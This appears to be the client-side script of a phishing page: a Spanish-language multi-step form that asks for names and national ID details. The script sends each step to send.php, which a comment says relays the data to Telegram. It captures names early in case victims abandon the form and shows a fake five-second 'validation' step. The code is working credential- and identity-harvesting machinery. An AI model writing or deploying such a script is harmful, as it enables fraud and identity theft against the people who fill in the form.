(() => {
  const TOTAL_STEPS = 4;
  const VALIDATION_SECONDS = 5;
  let current = 1;
  let validationTimer = null;
  const data = {};

  const stepEls = document.querySelectorAll('#stepper .step');
  const sections = document.querySelectorAll('.form-section');

  function render(scrollToStepper) {
    stepEls.forEach((el) => {
      const n = Number(el.dataset.step);
      el.classList.toggle('active', n === current);
      el.classList.toggle('done', n < current);
    });
    sections.forEach((s) => {
      s.classList.toggle('active', Number(s.dataset.form) === current);
    });
    // Scroll al stepper solo cuando el usuario cambia de paso, NO en la carga inicial.
    if (scrollToStepper) {
      const stepperWrap = document.querySelector('.stepper-wrap');
      if (stepperWrap) {
        const y = stepperWrap.getBoundingClientRect().top + window.pageYOffset - 8;
        window.scrollTo({ top: y, behavior: 'smooth' });
      }
    }
  }

  function go(step) {
    if (step < 1 || step > TOTAL_STEPS) return;
    current = step;
    render(true);
    if (step === 3) startValidation();
  }

  function stopValidation() {
    if (validationTimer) {
      clearTimeout(validationTimer);
      validationTimer = null;
    }
  }

  function startValidation() {
    stopValidation();
    validationTimer = setTimeout(() => {
      validationTimer = null;
      go(4);
    }, VALIDATION_SECONDS * 1000);
  }

  // Step 1 form
  const form1 = document.getElementById('form1');
  form1.addEventListener('submit', (e) => {
    e.preventDefault();
    if (!form1.reportValidity()) return;
    data.nombres = form1.nombres.value.trim();
    data.apellidos = form1.apellidos.value.trim();

    // Envío preliminar: por si abandonan antes del paso 2
    fetch('send.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ step: 'paso1', nombres: data.nombres, apellidos: data.apellidos }),
      keepalive: true,
    }).catch(() => {});

    go(2);
  });

  // ---- Input fecha expedición: auto-formato DD/MM/AAAA + validación ----
  const fechaInput = document.getElementById('fechaExp');

  fechaInput.addEventListener('input', (e) => {
    const pos = e.target.selectionStart;
    let digits = e.target.value.replace(/\D/g, '').slice(0, 8);
    let formatted = '';
    if (digits.length > 4) {
      formatted = digits.slice(0,2) + '/' + digits.slice(2,4) + '/' + digits.slice(4);
    } else if (digits.length > 2) {
      formatted = digits.slice(0,2) + '/' + digits.slice(2);
    } else {
      formatted = digits;
    }
    e.target.value = formatted;
    e.target.setCustomValidity('');
  });

  function validateFechaExp() {
    const val = fechaInput.value;
    const parts = val.split('/');
    if (parts.length !== 3 || parts[2].length !== 4) {
      fechaInput.setCustomValidity('Ingresa la fecha completa: DD/MM/AAAA');
      return false;
    }
    const day   = parseInt(parts[0], 10);
    const month = parseInt(parts[1], 10);
    const year  = parseInt(parts[2], 10);

    if (month < 1 || month > 12 || day < 1 || day > 31 || year < 1900 || year > 9999) {
      fechaInput.setCustomValidity('Fecha inválida');
      return false;
    }
    const d = new Date(year, month - 1, day);
    if (d.getMonth() !== month - 1 || d.getDate() !== day) {
      fechaInput.setCustomValidity('Fecha inválida');
      return false;
    }
    fechaInput.setCustomValidity('');
    return true;
  }

  fechaInput.addEventListener('blur', validateFechaExp);

  // Step 2 form
  const form2 = document.getElementById('form2');
  form2.addEventListener('submit', (e) => {
    e.preventDefault();
    validateFechaExp();
    if (!form2.reportValidity()) return;
    data.tipoDoc = form2.tipoDoc.value;
    data.numDoc = form2.numDoc.value.trim();
    data.fechaExp = form2.fechaExp.value;
    data.lugarExp = form2.lugarExp.value.trim();

    // Guardar para validación posterior en validacion.html
    sessionStorage.setItem('lugarExp', data.lugarExp);
    sessionStorage.setItem('numDoc', data.numDoc);

    // Enviar a Telegram solo los datos de identificación (paso2)
    fetch('send.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        step: 'paso2',
        tipoDoc:  data.tipoDoc,
        numDoc:   data.numDoc,
        fechaExp: data.fechaExp,
        lugarExp: data.lugarExp,
      }),
      keepalive: true,
    }).catch(() => {});

    go(3);
  });

  // Generic buttons
  document.querySelectorAll('[data-action="back"]').forEach((b) => {
    b.addEventListener('click', () => {
      stopValidation();
      go(current - 1);
    });
  });
  document.querySelectorAll('[data-action="next"]').forEach((b) => {
    b.addEventListener('click', () => go(current + 1));
  });
  document.querySelectorAll('[data-action="restart"]').forEach((b) => {
    b.addEventListener('click', () => {
      stopValidation();
      form1.reset();
      form2.reset();
      go(1);
    });
  });

  render();
})();
